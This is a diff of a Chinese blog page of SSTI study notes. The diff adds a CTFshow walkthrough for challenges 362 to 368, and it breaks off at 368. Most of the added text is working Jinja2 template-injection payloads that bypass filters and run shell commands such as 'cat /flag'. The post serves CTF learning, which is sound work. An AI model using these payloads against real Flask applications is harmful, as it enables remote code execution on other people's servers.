@@ -16,12 +16,12 @@
   <meta name="author" content="orange">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言:利用假期时间系统学习一下，主要讲的还是python的jinjia2,如果以后遇到其他相关的会继续补充。 参考文章: 1.SSTI（模板注入）漏洞（入门篇) 2.SSTI模板注入总结 3.Python模板注入(SSTI)深入学习 4.SSTI模板注入绕过(进阶篇) 一、基础知识1.初步了解SSTI就是服务器端模板注入(Server-Side Template Injection) 当使用一些框">
+    <meta name="description" content="前言:利用假期时间系统学习一下，主要讲的还是python的jinjia2,如果以后遇到其他相关的会继续补充。 参考文章: 1.SSTI（模板注入）漏洞（入门篇) 2.SSTI模板注入总结 3.Python模板注入(SSTI)深入学习 4.SSTI模板注入绕过(进阶篇) 5.CTFshow刷题日记-WEB-SSTI(web361-372)_ctfshow ssti 371-CSDN博客 一、基础知识">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssti模板注入学习">
 <meta property="og:url" content="http://example.com/2024/07/03/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/ssit%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="0raN9e的笔记">
-<meta property="og:description" content="前言:利用假期时间系统学习一下，主要讲的还是python的jinjia2,如果以后遇到其他相关的会继续补充。 参考文章: 1.SSTI（模板注入）漏洞（入门篇) 2.SSTI模板注入总结 3.Python模板注入(SSTI)深入学习 4.SSTI模板注入绕过(进阶篇) 一、基础知识1.初步了解SSTI就是服务器端模板注入(Server-Side Template Injection) 当使用一些框">
+<meta property="og:description" content="前言:利用假期时间系统学习一下，主要讲的还是python的jinjia2,如果以后遇到其他相关的会继续补充。 参考文章: 1.SSTI（模板注入）漏洞（入门篇) 2.SSTI模板注入总结 3.Python模板注入(SSTI)深入学习 4.SSTI模板注入绕过(进阶篇) 5.CTFshow刷题日记-WEB-SSTI(web361-372)_ctfshow ssti 371-CSDN博客 一、基础知识">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/ssti/1.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/ssti/2.png">
@@ -30,8 +30,10 @@
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/ssti/361-1.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/ssti/361-2.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/ssti/361-3.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/ssti/364.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/ssti/366.png">
 <meta property="article:published_time" content="2024-07-03T05:10:00.000Z">
-<meta property="article:modified_time" content="2024-07-04T16:15:43.255Z">
+<meta property="article:modified_time" content="2024-07-07T13:36:06.097Z">
 <meta property="article:author" content="orange">
 <meta property="article:tag" content="ssti">
 <meta name="twitter:card" content="summary_large_image">
@@ -271,7 +273,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.4k 字
+          4.5k 字
         
       </span>
     
@@ -282,7 +284,7 @@
         
         
         
-          29 分钟
+          38 分钟
         
       </span>
     
@@ -332,7 +334,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年7月5日 凌晨
+                    本文最后更新于 2024年7月7日 晚上
                   
                 
               </p>
@@ -346,6 +348,7 @@
 <p>2.<a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%7B%22request_id%22:%22171998276316800182178648%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=171998276316800182178648&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~hot_rank-5-120739989-null-null.nonecase&utm_term=ssit&spm=1018.2226.3001.4450">SSTI模板注入总结</a></p>
 <p>3.<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885?time__1311=n4+xnD0DRDyB5q053b7eit7Dt3MKAKDkWeD&alichlgref=https://cn.bing.com/#toc-0">Python模板注入(SSTI)深入学习</a></p>
 <p>4.<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过(进阶篇)</a></p>
+<p>5.<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120493997">CTFshow刷题日记-WEB-SSTI(web361-372)_ctfshow ssti 371-CSDN博客</a></p>
 <h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-初步了解"><a href="#1-初步了解" class="headerlink" title="1.初步了解"></a>1.初步了解</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)</p>
 <p>当使用一些框架的时候，服务端接收了用户的恶意输入以,未经处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
 <p>这里先举个简单的例子</p>
@@ -461,6 +464,56 @@
 <p>也可以用控制块来</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure>
 
+<h3 id="2-ctfshow-362"><a href="#2-ctfshow-362" class="headerlink" title="2.ctfshow 362"></a>2.ctfshow 362</h3><p>正常的思路先测一下是否是模板注入</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;1-1&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现是正确的，然后测看看子类，也是可以进行的</p>
+<p>但是最后发现应该把<strong>数字过滤</strong>了，那就试试另外一种吧</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>这种还是可以直接写出来的</p>
+<p>另外一种解法就是通过全角数字的解法得到答案</p>
+<h3 id="3-ctfshow-363"><a href="#3-ctfshow-363" class="headerlink" title="3.ctfshow 363"></a>3.ctfshow 363</h3><p>这题在此基础上<strong>过滤了引号</strong>，由此并不能直接用上面的方法，我尝试调用os.__class__.close并且用全角符号进行绕过,并且运用request.args.来间接调用发现好像并不能执行，因此，借鉴一下得到了一种解法</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.args.a</span>][<span class="hljs-symbol">request.args.b</span>](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure>
+
+<p>request.args用于获取 URL 中的查询参数如果有就返回如果没有将引发异常，这里后面的输入就可以得到答案了。</p>
+<p>config.__str__[2]就是o可以拼接os,但是字母不够，仅仅是一种思路</p>
+<p>此外还有一种利用chr的方式,也是可以的</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% set chr=url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.chr %&#125;&#123;% print url_</span>for.<span class="hljs-strong">__globals__</span>[chr(111)%2bchr(115)]%&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-ctfshow-364"><a href="#4-ctfshow-364" class="headerlink" title="4.ctfshow 364"></a>4.ctfshow 364</h3><p>这题<strong>过滤了args</strong>,这题可以用request.values来传参，相比之下values支持get和post，优先级的话是先get,使用方法基本一样</p>
+<p>上payload</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.values.a</span>][<span class="hljs-symbol">request.values.b</span>](request.values.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure>
+
+<p>当然这题发现好像也可以传cookies来进行</p>
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/364.png" srcset="/img/loading.gif" lazyload alt="364"></p>
+<p>当然了也可以用lipsum来，lipsum里面有内置的os模块</p>
+<p>payload是</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>.os.popen(request.values.aaa).read()&#125;&#125;&amp;aaa=cat /flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-ctfshow-365"><a href="#5-ctfshow-365" class="headerlink" title="5.ctfshow 365"></a>5.ctfshow 365</h3><p>这题用上面的lipsum的payload可以直接出答案</p>
+<p>看了一下网上的wp这题是**过滤[]**，在上面的内容讲到过__getitem__，在遇到了‘和[]被禁用的时候可以使用这个函数</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;config.<span class="hljs-strong">__str__</span>().<span class="hljs-strong">__getitem__</span>(22)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在这一题里面22是c，可以尝试构造cat &#x2F;flag，用~来拼接起来</p>
+<h3 id="6-ctfshow-366"><a href="#6-ctfshow-366" class="headerlink" title="6.ctfshow 366"></a>6.ctfshow 366</h3><p>这题在前面题目的基础上<strong>过滤了下划线</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=<span class="hljs-strong">__getitem__</span>&amp;c=os&amp;d=popen&amp;f=read<br></code></pre></td></tr></table></figure>
+
+<p>这里我自己有一个疑惑点，觉得getitem不是必要的，但是输入后又不正确，通过gpt询问后，给的大致原因是</p>
+<p>第二个URL之所以能够执行，是因为它使用了 <code>__getitem__</code> 这种更灵活的方式来访问全局变量，从而成功获取到 <code>os</code> 模块，并最终执行了命令。而第一个URL中直接使用 <code>attr</code> 的方式可能会因为解析问题而失败。我的理解是并不能直接有效的访问到os这个模块</p>
+<p>由于只是检测name里面的传参，其实也可以精简一点用cookie来传参</p>
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/366.png" srcset="/img/loading.gif" lazyload alt="366"></p>
+<p>PS(我认为这里换values，进行post传参也是一种方法，但是方法不成立orz)</p>
+<h3 id="7-ctfshow-367"><a href="#7-ctfshow-367" class="headerlink" title="7.ctfshow 367"></a>7.ctfshow 367</h3><p>这题<strong>过滤os</strong></p>
+<p>直接用上面的payload直接可以过，看wp有一种是用get的方法</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure>
+
+<p>366的payload使用多个 <code>attr</code> 需要模板引擎逐步解析并执行每个步骤，在某些情况下可能出现解析和执行顺序问题，导致无法正确执行 <code>read</code>。</p>
+<p>这一题的payload链式调用方式更简单，直接执行一系列方法调用，容易通过模板引擎解析并执行</p>
+<p>至于我想的问题？上面的为什么后面不能直接调用read()</p>
+<p>每一步 <code>attr</code> 调用之间是独立的，模板引擎会分别解析和执行每个 <code>attr</code>，这样导致在调用 <code>os.popen(&quot;cat /flag&quot;)</code> 后，结果没有直接传递给 <code>attr(request.values.f)()</code>。因此，模板引擎可能在 <code>attr</code> 调用之间无法正确链接上下文，导致 <code>read</code> 无法直接执行。</p>
+<p>这是两者payload的区别，也是记录一下方便回顾。</p>
+<h3 id="8-ctfshow-368"><a href="#8-ctfshow-368" class="headerlink" title="8.ctfshow 368"></a>8.ctfshow 368</h3><p>测试了一下，这题**过滤了“</p>
 
                 
               </div>
